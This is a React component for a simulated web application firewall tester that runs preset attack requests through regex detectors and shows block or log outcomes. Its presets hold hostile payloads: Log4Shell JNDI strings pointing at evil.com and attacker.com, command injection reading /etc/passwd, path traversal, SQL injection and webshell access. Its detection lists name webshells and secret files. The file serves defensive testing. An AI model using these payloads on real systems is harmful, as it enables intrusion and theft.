import React, { useState } from 'react';
import { WAF_FLAGS, SEVERITY_COLORS, OWASP_TOP_10 } from '../data/wafData';
import './RulesSimulator.css';

const RulesSimulator = ({ rules = [] }) => {
  const [testRequest, setTestRequest] = useState({
    url: '/content/dam/assets.json',
    method: 'GET',
    headers: {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Host': 'example.com'
    },
    clientIp: '192.168.1.100',
    clientCountry: 'US',
    tier: 'publish'
  });
  
  const [simulationResults, setSimulationResults] = useState(null);
  const [attackType, setAttackType] = useState('custom');
  const [showOwaspMapping, setShowOwaspMapping] = useState(false);

  // Known malicious IPs for ATTACK-FROM-BAD-IP simulation
  const KNOWN_BAD_IPS = [
    '185.220.101.45', '45.155.205.233', '89.248.167.131', '23.129.64.132',
    '185.142.239.1', '178.128.23.10', '5.188.10.100', '94.102.49.190'
  ];

  const ATTACK_PRESETS = {
    custom: {
      name: 'Custom Request',
      description: 'Configure your own test request',
      category: 'Custom',
      request: null
    },
    // Recommended Adobe Rules Tests
    attackFromBadIp: {
      name: 'ATTACK-FROM-BAD-IP Test',
      description: 'SQL injection from known malicious IP (Adobe recommended BLOCK)',
      category: 'Adobe Recommended',
      owaspMapping: 'A03:2021',
      request: {
        url: "/search?q=' OR '1'='1",
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          'Host': 'example.com'
        },
        clientIp: '185.220.101.45', // Known bad IP
        clientCountry: 'RU',
        tier: 'publish',
        isKnownBadIp: true
      }
    },
    generalAttack: {
      name: 'ATTACK Flag Test',
      description: 'General attack pattern from normal IP (Adobe recommended LOG first)',
      category: 'Adobe Recommended',
      owaspMapping: 'A03:2021',
      request: {
        url: "/api/user?id=1%20UNION%20SELECT%20*%20FROM%20users",
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X)',
          'Host': 'example.com'
        },
        clientIp: '203.0.113.50', // Normal IP
        clientCountry: 'US',
        tier: 'publish',
        isKnownBadIp: false
      }
    },
    // OWASP Top 10 Scenarios
    sqli: {
      name: 'SQL Injection (A03)',
      description: 'OWASP A03:2021 Injection - SQL injection attempt',
      category: 'OWASP Top 10',
      owaspMapping: 'A03:2021',
      request: {
        url: "/search?q=' OR '1'='1",
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
          'Host': 'example.com'
        },
        clientIp: '192.168.1.50',
        clientCountry: 'RU',
        tier: 'publish'
      }
    },
    xss: {
      name: 'Cross-Site Scripting (A03)',
      description: 'OWASP A03:2021 Injection - XSS payload',
      category: 'OWASP Top 10',
      owaspMapping: 'A03:2021',
      request: {
        url: "/comment?text=<script>alert('xss')</script>",
        method: 'POST',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Host': 'example.com',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        clientIp: '192.168.1.50',
        clientCountry: 'US',
        tier: 'publish'
      }
    },
    traversal: {
      name: 'Path Traversal (A01)',
      description: 'OWASP A01:2021 Broken Access Control - Directory traversal',
      category: 'OWASP Top 10',
      owaspMapping: 'A01:2021',
      request: {
        url: '/download?file=../../../etc/passwd',
        method: 'GET',
        headers: {
          'User-Agent': 'curl/7.64.1',
          'Host': 'example.com'
        },
        clientIp: '10.0.0.1',
        clientCountry: 'CN',
        tier: 'publish'
      }
    },
    log4j: {
      name: 'Log4Shell (A06)',
      description: 'OWASP A06:2021 Vulnerable Components - CVE-2021-44228',
      category: 'OWASP Top 10',
      owaspMapping: 'A06:2021',
      request: {
        url: '/api/search',
        method: 'GET',
        headers: {
          'User-Agent': '${jndi:ldap://evil.com/a}',
          'Host': 'example.com',
          'X-Api-Key': '${jndi:rmi://attacker.com/obj}'
        },
        clientIp: '45.155.205.233',
        clientCountry: 'RU',
        tier: 'publish'
      }
    },
    cmdexe: {
      name: 'Command Injection (A03)',
      description: 'OWASP A03:2021 Injection - OS command injection',
      category: 'OWASP Top 10',
      owaspMapping: 'A03:2021',
      request: {
        url: '/ping?host=127.0.0.1;cat /etc/passwd',
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Host': 'example.com'
        },
        clientIp: '192.168.1.200',
        clientCountry: 'IR',
        tier: 'publish'
      }
    },
    // Bot Detection
    scanner: {
      name: 'Vulnerability Scanner (A07)',
      description: 'OWASP A07:2021 Auth Failures - Security scanner detection',
      category: 'Bot Detection',
      owaspMapping: 'A07:2021',
      request: {
        url: '/admin/.git/config',
        method: 'GET',
        headers: {
          'User-Agent': 'Nikto/2.1.6',
          'Host': 'example.com'
        },
        clientIp: '192.168.1.100',
        clientCountry: 'US',
        tier: 'author'
      }
    },
    noua: {
      name: 'Missing User-Agent (A07)',
      description: 'OWASP A07:2021 Auth Failures - Bot without identification',
      category: 'Bot Detection',
      owaspMapping: 'A07:2021',
      request: {
        url: '/api/data',
        method: 'GET',
        headers: {
          'Host': 'example.com'
        },
        clientIp: '10.0.0.50',
        clientCountry: 'DE',
        tier: 'publish'
      }
    },
    backdoor: {
      name: 'Backdoor Access (A08)',
      description: 'OWASP A08:2021 Software Integrity - Webshell access attempt',
      category: 'Malware',
      owaspMapping: 'A08:2021',
      request: {
        url: '/upload/c99shell.php?cmd=ls',
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Host': 'example.com'
        },
        clientIp: '89.248.167.131',
        clientCountry: 'NL',
        tier: 'publish'
      }
    },
    // Geographic/Policy
    ofac: {
      name: 'OFAC Country Block',
      description: 'Request from sanctioned country - blocked by geo policy',
      category: 'Policy Enforcement',
      request: {
        url: '/content/page.html',
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Host': 'example.com'
        },
        clientIp: '5.134.128.100',
        clientCountry: 'IR',
        tier: 'publish'
      }
    },
    torNode: {
      name: 'Tor Exit Node',
      description: 'Request from known Tor exit node - anonymized traffic',
      category: 'Anonymization',
      request: {
        url: '/admin/login',
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0)',
          'Host': 'example.com'
        },
        clientIp: '23.129.64.132', // Known Tor exit
        clientCountry: 'US',
        tier: 'author',
        isTorExitNode: true
      }
    },
    // Rate Limiting
    rateLimit: {
      name: 'Rate Limit Test',
      description: 'Simulate high-volume requests exceeding rate limits',
      category: 'DoS Protection',
      request: {
        url: '/api/resource',
        method: 'GET',
        headers: {
          'User-Agent': 'ApacheBench/2.3',
          'Host': 'example.com'
        },
        clientIp: '192.168.1.100',
        clientCountry: 'US',
        tier: 'publish',
        simulatedRequests: 150
      }
    },
    // Legitimate Request
    legitimate: {
      name: 'Legitimate Request',
      description: 'Normal request that should pass all rules',
      category: 'Baseline',
      request: {
        url: '/content/dam/marketing/brochure.pdf',
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Host': 'www.example.com',
          'Accept': 'text/html,application/xhtml+xml',
          'Accept-Language': 'en-US,en;q=0.9'
        },
        clientIp: '72.21.206.80',
        clientCountry: 'US',
        tier: 'publish'
      }
    }
  };

  const selectAttackPreset = (presetKey) => {
    setAttackType(presetKey);
    if (presetKey !== 'custom' && ATTACK_PRESETS[presetKey].request) {
      setTestRequest(ATTACK_PRESETS[presetKey].request);
    }
  };

  const detectAttackPatterns = (request) => {
    const detected = [];
    const url = request.url.toLowerCase();
    const userAgent = (request.headers['User-Agent'] || '').toLowerCase();
    const allHeaders = JSON.stringify(request.headers).toLowerCase();
    const isKnownBadIp = request.isKnownBadIp || KNOWN_BAD_IPS.includes(request.clientIp);

    // SQL Injection patterns
    const sqliPatterns = [/('|"|;|--|union|select|insert|delete|drop|update|exec)/i];
    if (sqliPatterns.some(p => p.test(url) || p.test(allHeaders))) {
      detected.push({ flag: 'SQLI', matched: true, pattern: 'SQL injection keywords detected' });
    }

    // XSS patterns
    const xssPatterns = [/<script|javascript:|onerror=|onload=|<img|<svg/i];
    if (xssPatterns.some(p => p.test(url) || p.test(allHeaders))) {
      detected.push({ flag: 'XSS', matched: true, pattern: 'XSS payload detected' });
    }

    // Path Traversal patterns
    const traversalPatterns = [/\.\.\//i, /\.\.\\/, /%2e%2e/i];
    if (traversalPatterns.some(p => p.test(url))) {
      detected.push({ flag: 'TRAVERSAL', matched: true, pattern: 'Path traversal sequence detected' });
    }

    // Log4j patterns
    const log4jPatterns = [/\$\{jndi:/i, /\$\{.*jndi/i];
    if (log4jPatterns.some(p => p.test(url) || p.test(allHeaders))) {
      detected.push({ flag: 'LOG4J-JNDI', matched: true, pattern: 'JNDI lookup detected' });
    }

    // Command Execution patterns
    const cmdPatterns = [/;.*cat|;.*ls|;.*rm|\|.*sh|`.*`|\$\(/i];
    if (cmdPatterns.some(p => p.test(url))) {
      detected.push({ flag: 'CMDEXE', matched: true, pattern: 'Command injection detected' });
    }

    // Scanner detection
    const scannerPatterns = [/nikto|sqlmap|nessus|acunetix|burp|owasp.*zap|masscan/i];
    if (scannerPatterns.some(p => p.test(userAgent))) {
      detected.push({ flag: 'SCANNER', matched: true, pattern: 'Security scanner User-Agent' });
    }

    // No User-Agent
    if (!request.headers['User-Agent'] || request.headers['User-Agent'].trim() === '') {
      detected.push({ flag: 'NOUA', matched: true, pattern: 'Missing User-Agent header' });
    }

    // Private file access
    const privatePatterns = [/\.htaccess|\.git|\.env|wp-config|\.ssh/i];
    if (privatePatterns.some(p => p.test(url))) {
      detected.push({ flag: 'PRIVATEFILE', matched: true, pattern: 'Sensitive file access attempt' });
    }

    // Backdoor patterns
    const backdoorPatterns = [/c99shell|r57shell|wso|filesm|shell\.php/i];
    if (backdoorPatterns.some(p => p.test(url))) {
      detected.push({ flag: 'BACKDOOR', matched: true, pattern: 'Webshell/backdoor access attempt' });
    }

    // Malicious User-Agent
    const maliciousUAPatterns = [/zmeu|masscan|sqlmap/i];
    if (maliciousUAPatterns.some(p => p.test(userAgent))) {
      detected.push({ flag: 'USERAGENT', matched: true, pattern: 'Known malicious User-Agent' });
    }

    // Tor exit node detection
    if (request.isTorExitNode) {
      detected.push({ flag: 'TORNODE', matched: true, pattern: 'Traffic from Tor exit node' });
    }

    // Null byte injection
    const nullbytePatterns = [/%00/i, /\\0/];
    if (nullbytePatterns.some(p => p.test(url))) {
      detected.push({ flag: 'NULLBYTE', matched: true, pattern: 'Null byte injection detected' });
    }

    // General attack detection (if any pattern detected)
    if (detected.length > 0) {
      detected.unshift({ flag: 'ATTACK', matched: true, pattern: 'General attack pattern detected' });
    }

    // ATTACK-FROM-BAD-IP (only if attack + bad IP)
    if (detected.length > 0 && isKnownBadIp) {
      detected.unshift({ flag: 'ATTACK-FROM-BAD-IP', matched: true, pattern: 'Attack from known malicious IP' });
    }

    return detected;
  };

  const runSimulation = () => {
    const detectedPatterns = detectAttackPatterns(testRequest);
    const isKnownBadIp = testRequest.isKnownBadIp || KNOWN_BAD_IPS.includes(testRequest.clientIp);
    
    const results = {
      request: { ...testRequest },
      timestamp: new Date().toISOString(),
      detectedPatterns,
      matchedRules: [],
      finalAction: 'allow',
      blocked: false,
      isKnownBadIp,
      recommendedAction: null
    };

    // Check against WAF flags
    detectedPatterns.forEach(pattern => {
      if (WAF_FLAGS[pattern.flag]) {
        results.matchedRules.push({
          type: 'waf-detection',
          flag: pattern.flag,
          flagInfo: WAF_FLAGS[pattern.flag],
          pattern: pattern.pattern
        });
      }
    });

    // Check geo-blocking (OFAC countries)
    const ofacCountries = ['SY', 'BY', 'MM', 'KP', 'IQ', 'CD', 'SD', 'IR', 'LR', 'ZW', 'CU', 'CI'];
    if (ofacCountries.includes(testRequest.clientCountry)) {
      results.matchedRules.push({
        type: 'geo-block',
        reason: `Request from OFAC sanctioned country: ${testRequest.clientCountry}`,
        action: 'block'
      });
    }

    // Determine final action based on Adobe recommendations
    if (results.matchedRules.length > 0) {
      const hasAttackFromBadIp = results.detectedPatterns.some(p => p.flag === 'ATTACK-FROM-BAD-IP');
      const hasCriticalFlags = results.detectedPatterns.some(p => 
        WAF_FLAGS[p.flag]?.severity === 'critical'
      );
      const hasGeoBlock = results.matchedRules.some(r => r.type === 'geo-block');
      
      if (hasAttackFromBadIp || hasGeoBlock) {
        results.finalAction = 'block';
        results.blocked = true;
        results.recommendedAction = 'BLOCK (Safe to block immediately)';
      } else if (hasCriticalFlags) {
        results.finalAction = 'log';
        results.blocked = false;
        results.recommendedAction = 'LOG first (verify no false positives, then BLOCK)';
      } else {
        results.finalAction = 'log';
        results.recommendedAction = 'LOG (for monitoring)';
      }
    }

    setSimulationResults(results);
  };

  const updateHeader = (key, value) => {
    setTestRequest(prev => ({
      ...prev,
      headers: {
        ...prev.headers,
        [key]: value
      }
    }));
  };

  // Group presets by category
  const groupedPresets = Object.entries(ATTACK_PRESETS).reduce((acc, [key, preset]) => {
    const category = preset.category || 'Other';
    if (!acc[category]) acc[category] = [];
    acc[category].push({ key, ...preset });
    return acc;
  }, {});

  return (
    <div className="rules-simulator">
      <div className="simulator-header">
        <div>
          <h1>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <polygon points="5 3 19 12 5 21 5 3" />
            </svg>
            WAF Rules Simulator
          </h1>
          <p>Test how WAF rules handle attacks with OWASP-aligned scenarios and Adobe-recommended patterns</p>
        </div>
        <div className="simulator-actions">
          <button className="btn btn-ghost" onClick={() => setShowOwaspMapping(!showOwaspMapping)}>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
            </svg>
            OWASP Mapping
          </button>
        </div>
      </div>

      {showOwaspMapping && (
        <div className="owasp-panel card animate-slide-up">
          <div className="card-header">
            <h3 className="card-title">OWASP Top 10 (2021) Attack Coverage</h3>
            <button className="btn btn-ghost btn-sm" onClick={() => setShowOwaspMapping(false)}>×</button>
          </div>
          <div className="owasp-mini-grid">
            {Object.entries(OWASP_TOP_10).map(([code, item]) => (
              <div key={code} className={`owasp-mini-card ${item.wafFlags.length > 0 ? 'covered' : 'partial'}`}>
                <span className="owasp-mini-code">{code}</span>
                <span className="owasp-mini-name">{item.name}</span>
                {item.wafFlags.length > 0 && (
                  <div className="owasp-mini-flags">
                    {item.wafFlags.slice(0, 3).map(f => <code key={f}>{f}</code>)}
                    {item.wafFlags.length > 3 && <span>+{item.wafFlags.length - 3}</span>}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      <div className="simulator-grid">
        <div className="attack-presets card">
          <div className="card-header">
            <h3 className="card-title">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
              </svg>
              Attack Scenarios
            </h3>
          </div>
          <div className="presets-list">
            {Object.entries(groupedPresets).map(([category, presets]) => (
              <div key={category} className="preset-category">
                <h4 className="preset-category-title">{category}</h4>
                {presets.map(preset => (
                  <button
                    key={preset.key}
                    className={`preset-item ${attackType === preset.key ? 'active' : ''}`}
                    onClick={() => selectAttackPreset(preset.key)}
                  >
                    <div className="preset-info">
                      <span className="preset-name">{preset.name}</span>
                      <span className="preset-desc">{preset.description}</span>
                      {preset.owaspMapping && (
                        <span className="preset-owasp">{preset.owaspMapping}</span>
                      )}
                    </div>
                    {attackType === preset.key && (
                      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <polyline points="20 6 9 17 4 12" />
                      </svg>
                    )}
                  </button>
                ))}
              </div>
            ))}
          </div>
        </div>

        <div className="request-builder card">
          <div className="card-header">
            <h3 className="card-title">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
              </svg>
              Test Request
            </h3>
          </div>
          
          <div className="request-form">
            <div className="form-row">
              <div className="form-group method-select">
                <label className="form-label">Method</label>
                <select
                  className="form-select"
                  value={testRequest.method}
                  onChange={(e) => setTestRequest({ ...testRequest, method: e.target.value })}
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                  <option value="DELETE">DELETE</option>
                </select>
              </div>
              <div className="form-group url-input">
                <label className="form-label">URL Path</label>
                <input
                  type="text"
                  className="form-input"
                  value={testRequest.url}
                  onChange={(e) => setTestRequest({ ...testRequest, url: e.target.value })}
                  placeholder="/path/to/resource"
                />
              </div>
            </div>

            <div className="form-row">
              <div className="form-group">
                <label className="form-label">Client IP</label>
                <input
                  type="text"
                  className="form-input"
                  value={testRequest.clientIp}
                  onChange={(e) => setTestRequest({ ...testRequest, clientIp: e.target.value })}
                  placeholder="192.168.1.100"
                />
                {KNOWN_BAD_IPS.includes(testRequest.clientIp) && (
                  <span className="field-badge bad-ip">⚠️ Known Bad IP</span>
                )}
              </div>
              <div className="form-group">
                <label className="form-label">Country Code</label>
                <input
                  type="text"
                  className="form-input"
                  value={testRequest.clientCountry}
                  onChange={(e) => setTestRequest({ ...testRequest, clientCountry: e.target.value.toUpperCase() })}
                  placeholder="US"
                  maxLength={2}
                />
              </div>
              <div className="form-group">
                <label className="form-label">Tier</label>
                <select
                  className="form-select"
                  value={testRequest.tier}
                  onChange={(e) => setTestRequest({ ...testRequest, tier: e.target.value })}
                >
                  <option value="publish">Publish</option>
                  <option value="author">Author</option>
                </select>
              </div>
            </div>

            <div className="headers-section">
              <h4>Request Headers</h4>
              <div className="headers-grid">
                <div className="form-group">
                  <label className="form-label">User-Agent</label>
                  <input
                    type="text"
                    className="form-input"
                    value={testRequest.headers['User-Agent'] || ''}
                    onChange={(e) => updateHeader('User-Agent', e.target.value)}
                    placeholder="Mozilla/5.0..."
                  />
                </div>
                <div className="form-group">
                  <label className="form-label">Host</label>
                  <input
                    type="text"
                    className="form-input"
                    value={testRequest.headers['Host'] || ''}
                    onChange={(e) => updateHeader('Host', e.target.value)}
                    placeholder="example.com"
                  />
                </div>
              </div>
            </div>

            <button className="btn btn-primary btn-lg run-btn" onClick={runSimulation}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polygon points="5 3 19 12 5 21 5 3" />
              </svg>
              Run Simulation
            </button>
          </div>
        </div>
      </div>

      {simulationResults && (
        <div className="results-section animate-slide-up">
          <div className={`result-summary card ${simulationResults.blocked ? 'blocked' : simulationResults.detectedPatterns.length > 0 ? 'logged' : 'allowed'}`}>
            <div className="result-icon">
              {simulationResults.blocked ? (
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <circle cx="12" cy="12" r="10" />
                  <line x1="4.93" y1="4.93" x2="19.07" y2="19.07" />
                </svg>
              ) : simulationResults.detectedPatterns.length > 0 ? (
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
                  <line x1="12" y1="9" x2="12" y2="13" />
                  <line x1="12" y1="17" x2="12.01" y2="17" />
                </svg>
              ) : (
                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
              )}
            </div>
            <div className="result-content">
              <h3>
                {simulationResults.blocked 
                  ? 'Request Would Be BLOCKED' 
                  : simulationResults.detectedPatterns.length > 0 
                    ? 'Request Would Be LOGGED (Recommended)' 
                    : 'Request Would Be ALLOWED'
                }
              </h3>
              <p>
                {simulationResults.blocked
                  ? `${simulationResults.matchedRules.length} security rule(s) triggered BLOCK action`
                  : simulationResults.detectedPatterns.length > 0
                    ? `${simulationResults.detectedPatterns.length} pattern(s) detected - recommend LOG before BLOCK`
                    : 'No security rules matched this request'
                }
              </p>
              <div className="result-badges">
                <span className={`result-badge ${simulationResults.finalAction}`}>
                  Action: {simulationResults.finalAction.toUpperCase()}
                </span>
                {simulationResults.isKnownBadIp && (
                  <span className="result-badge bad-ip">Known Bad IP</span>
                )}
              </div>
              {simulationResults.recommendedAction && (
                <p className="recommended-action">
                  <strong>Adobe Recommendation:</strong> {simulationResults.recommendedAction}
                </p>
              )}
            </div>
          </div>

          {simulationResults.detectedPatterns.length > 0 && (
            <div className="card">
              <div className="card-header">
                <h3 className="card-title">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
                    <line x1="12" y1="9" x2="12" y2="13" />
                    <line x1="12" y1="17" x2="12.01" y2="17" />
                  </svg>
                  Detected Attack Patterns ({simulationResults.detectedPatterns.length})
                </h3>
              </div>
              <div className="table-container">
                <table className="table">
                  <thead>
                    <tr>
                      <th>WAF Flag</th>
                      <th>Category</th>
                      <th>Severity</th>
                      <th>Pattern Detected</th>
                      <th>Recommended Action</th>
                    </tr>
                  </thead>
                  <tbody>
                    {simulationResults.detectedPatterns.map((pattern, index) => {
                      const flagInfo = WAF_FLAGS[pattern.flag];
                      const isRecommendedBlock = pattern.flag === 'ATTACK-FROM-BAD-IP';
                      return (
                        <tr key={index} className={isRecommendedBlock ? 'highlight-row' : ''}>
                          <td>
                            <code className="code-inline">{pattern.flag}</code>
                            {flagInfo?.recommended && <span className="rec-badge">⭐</span>}
                          </td>
                          <td>{flagInfo?.category || 'Unknown'}</td>
                          <td>
                            <span
                              className="badge"
                              style={{
                                background: SEVERITY_COLORS[flagInfo?.severity || 'medium']?.bg,
                                color: SEVERITY_COLORS[flagInfo?.severity || 'medium']?.color
                              }}
                            >
                              {flagInfo?.severity || 'unknown'}
                            </span>
                          </td>
                          <td>{pattern.pattern}</td>
                          <td>
                            <span className={`action-badge ${isRecommendedBlock ? 'block' : 'log'}`}>
                              {isRecommendedBlock ? 'BLOCK (Safe)' : flagInfo?.recommendedAction?.toUpperCase() || 'LOG'}
                            </span>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {simulationResults.matchedRules.filter(r => r.type === 'geo-block').length > 0 && (
            <div className="card geo-alert">
              <div className="card-header">
                <h3 className="card-title">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="12" cy="12" r="10" />
                    <line x1="2" y1="12" x2="22" y2="12" />
                    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
                  </svg>
                  Geographic Restriction Triggered
                </h3>
              </div>
              <p className="geo-message">
                Request originates from <strong>{testRequest.clientCountry}</strong>, which is on the OFAC sanctioned countries list.
                This request would be blocked regardless of other WAF rules.
              </p>
            </div>
          )}

          <div className="card">
            <div className="card-header">
              <h3 className="card-title">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z" />
                  <polyline points="14 2 14 8 20 8" />
                </svg>
                CDN Log Entry (Simulated)
              </h3>
            </div>
            <pre className="code-block log-output">
{JSON.stringify({
  timestamp: simulationResults.timestamp,
  cli_ip: testRequest.clientIp,
  cli_country: testRequest.clientCountry,
  method: testRequest.method,
  url: testRequest.url,
  host: testRequest.headers['Host'],
  req_ua: testRequest.headers['User-Agent'] || '',
  tier: testRequest.tier,
  status: simulationResults.blocked ? 403 : 200,
  action: simulationResults.finalAction,
  wafFlags: simulationResults.detectedPatterns.map(p => p.flag).join(',') || 'none',
  rules: simulationResults.matchedRules.length > 0 
    ? simulationResults.matchedRules.map(r => 
        r.type === 'waf-detection' ? `waf:${r.flag}` : `geo:${testRequest.clientCountry}`
      ).join(';')
    : 'none'
}, null, 2)}
            </pre>
          </div>
        </div>
      )}
    </div>
  );
};

export default RulesSimulator;
